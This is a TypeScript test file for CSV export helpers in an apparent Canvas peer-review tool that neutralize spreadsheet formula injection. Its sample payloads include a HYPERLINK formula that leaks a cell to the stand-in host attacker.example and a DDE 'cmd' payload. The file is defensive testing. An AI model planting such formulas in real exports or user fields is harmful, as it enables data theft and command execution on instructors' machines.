// Ports TestCsvSafeCell, TestCsvRow and TestRowsToCsvString from tests/security/test_csv_formula_injection.py.
// TestPeerReviewExportRow and TestCompletionCsvReport there exercise the peer-review exporters and
// belong with those modules' tests.
//
// CSV exports must not hand a spreadsheet an executable formula. Peer-review comment text is authored
// by another student, and Canvas names and emails are user-controlled on many instances. Those values
// are exported to CSV reports that instructors open in Excel, Numbers, or Sheets, where a cell starting
// with '=', '+', '-', '@', a tab, or a carriage return is evaluated as a formula. CSV quoting does not
// prevent this: it only makes the value parse as a single cell, which the spreadsheet then evaluates.
import { describe, it, expect } from 'vitest';
import { csvRow, csvSafeCell, rowsToCsvString } from '../../src/core/csv-safety';

// Representative payloads. The hyperlink one is the realistic exfiltration shape:
// it renders as innocuous text and leaks a neighbouring cell on click.
const ATTACKS = [
  '=1+1',
  '=HYPERLINK("https://attacker.example/?d="&A1,"Click for feedback")',
  '+1+1',
  '-1+1',
  '@SUM(A1:A9)',
  '\t=1+1',
  '\r=1+1',
  '   =1+1',
  "=cmd|' /c calc'!A0",
];

/** Minimal RFC 4180 reader, standing in for the Python csv.reader the upstream tests round-trip through. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let quoted = false;
  let i = 0;
  while (i < text.length) {
    const ch = text.charAt(i);
    if (quoted) {
      if (ch === '"' && text.charAt(i + 1) === '"') {
        field += '"';
        i += 2;
      } else if (ch === '"') {
        quoted = false;
        i += 1;
      } else {
        field += ch;
        i += 1;
      }
    } else if (ch === '"' && field === '') {
      quoted = true;
      i += 1;
    } else if (ch === ',') {
      row.push(field);
      field = '';
      i += 1;
    } else if (ch === '\n' || ch === '\r') {
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
      i += ch === '\r' && text.charAt(i + 1) === '\n' ? 2 : 1;
    } else {
      field += ch;
      i += 1;
    }
  }
  row.push(field);
  rows.push(row);
  return rows;
}

describe('csvSafeCell', () => {
  it.each(ATTACKS)('neutralizes the formula %j', (payload) => {
    const result = csvSafeCell(payload);
    expect(result.startsWith("'")).toBe(true);
    // The original text is preserved after the marker, so no data is lost.
    expect(result.slice(1)).toBe(payload);
  });

  it.each([
    'Great work on the intro!',
    'I disagree with your thesis, but nicely argued.',
    'See section 2.1',
    '100% agree',
    'a=b', // '=' not in first position
    '',
  ])('leaves the ordinary comment %j untouched', (benign) => {
    expect(csvSafeCell(benign)).toBe(benign);
  });

  it('turns a missing value into an empty cell', () => {
    expect(csvSafeCell(null)).toBe('');
    expect(csvSafeCell(undefined)).toBe('');
  });

  it.each(ATTACKS)('keeps %j inert through a CSV round trip', (payload) => {
    // Still inert, still one cell.
    const row = parseCsv(rowsToCsvString([csvSafeCell(payload), 'next'], []))[0] as string[];
    expect(row).toHaveLength(2); // payload did not break out of its cell
    expect(row[0]?.charAt(0)).toBe("'");
    expect(row[0]).toBe(`'${payload}`);
    expect(row[1]).toBe('next');
  });

  // Expected values produced by upstream csv_safe_cell.
  const cases: Array<[unknown, string]> = [
    // Leading whitespace is looked past, including NBSP and a byte-order mark.
    ['\u00a0=x', "'\u00a0=x"],
    ['\ufeff@x', "'\ufeff@x"],
    [' \n\t\r=x', "' \n\t\r=x"],
    [' \n\t\r', ' \n\t\r'],
    // A leading tab or CR is itself skipped as whitespace; what follows decides.
    ['\tfoo', '\tfoo'],
    ['\r-1', "'\r-1"],
    // Other Unicode spaces are not skipped.
    ['\u2003=x', '\u2003=x'],
    ["'=x", "'=x"],
    // Non-strings are written as text first, so a negative number is marked too.
    [5, '5'],
    [-5, "'-5"],
    [-1.5, "'-1.5"],
    [0, '0'],
    [true, 'True'],
    [false, 'False'],
  ];
  it.each(cases)('%j -> %j', (value, expected) => {
    expect(csvSafeCell(value)).toBe(expected);
  });

  it('handles a very long cell quickly', () => {
    const start = performance.now();
    expect(csvSafeCell(`${' '.repeat(200_000)}=1`)).toBe(`'${' '.repeat(200_000)}=1`);
    expect(csvSafeCell(' '.repeat(200_000))).toBe(' '.repeat(200_000));
    expect(performance.now() - start).toBeLessThan(1000);
  });
});

describe('csvRow', () => {
  it('leaves numeric columns alone', () => {
    // A computed negative number must not gain a quote and become text.
    expect(csvRow(['=evil', -5, 'ok'], [0, 2])).toEqual(["'=evil", '-5', 'ok']);
  });

  it('treats all columns as untrusted by default', () => {
    expect(csvRow(['=a', '=b'])).toEqual(["'=a", "'=b"]);
    expect(csvRow(['=a', '=b', null, true])).toEqual(["'=a", "'=b", '', 'True']);
  });

  it('neutralizes nothing when given an empty column list', () => {
    expect(csvRow(['=a', null, '=b'], [])).toEqual(['=a', '', '=b']);
  });
});

describe('rowsToCsvString', () => {
  it('keeps embedded delimiters inside their cell', () => {
    // A hand-rolled exporter mis-quotes these.
    const nasty = 'He said "great", then\nadded a newline';
    const out = rowsToCsvString(['a', 'b'], [[csvSafeCell(nasty), 1]]);
    const rows = parseCsv(out);
    expect(rows[0]).toEqual(['a', 'b']);
    expect(rows[1]).toEqual([nasty, '1']); // value survived a round trip intact
    expect(out).toBe('a,b\n"He said ""great"", then\nadded a newline",1');
  });

  // Expected values produced by upstream rows_to_csv_string (Python csv.writer, "\n" line ends).
  const cases: Array<[unknown[], unknown[][], string]> = [
    [['h1', 'h2'], [], 'h1,h2'],
    [['h1', 'h2'], [['a b', ' a'], ['x', 'y']], 'h1,h2\na b, a\nx,y'],
    [['h'], [['a,b'], ['a"b'], ['"'], ['a\rb'], ['a\nb']], 'h\n"a,b"\n"a""b"\n""""\n"a\rb"\n"a\nb"'],
    // Only comma, quote, CR and LF force quoting.
    [['h'], [['a;b'], ['\t'], ["'=x"], ['a\u000bb'], ['a\u2028b']], "h\na;b\n\t\n'=x\na\u000bb\na\u2028b"],
    // A row of one empty field is written as "" so it is not read as a blank line.
    [['h'], [[''], [null], ['', ''], [null, null]], 'h\n""\n""\n,\n,'],
    // Non-strings are written as text; null is empty.
    [['n', 'b', 'x'], [[1, true, null], [-5, false, 0]], 'n,b,x\n1,True,\n-5,False,0'],
    // Trailing empty rows leave no trailing newline.
    [['h'], [['a'], [], []], 'h\na'],
    [[], [], ''],
    [[], [['a']], '\na'],
  ];
  it.each(cases)('%j %j', (header, rows, expected) => {
    expect(rowsToCsvString(header, rows)).toBe(expected);
  });

  it('accepts any iterable of rows', () => {
    function* rows(): Generator<unknown[]> {
      yield ['a', 1];
      yield ['b', 2];
    }
    expect(rowsToCsvString(new Set(['k', 'v']), rows())).toBe('k,v\na,1\nb,2');
  });

  it('handles adversarial cells in linear time', () => {
    const size = 200_000;
    const cells = ['"'.repeat(size), ','.repeat(size), `a${'\n'.repeat(size)}b`, '\n'.repeat(size)];
    const start = performance.now();
    const out = rowsToCsvString(['h'], cells.map((cell) => [cell, cell]));
    expect(performance.now() - start).toBeLessThan(1000);
    expect(parseCsv(out).slice(1)).toEqual(cells.map((cell) => [cell, cell]));
  });
});
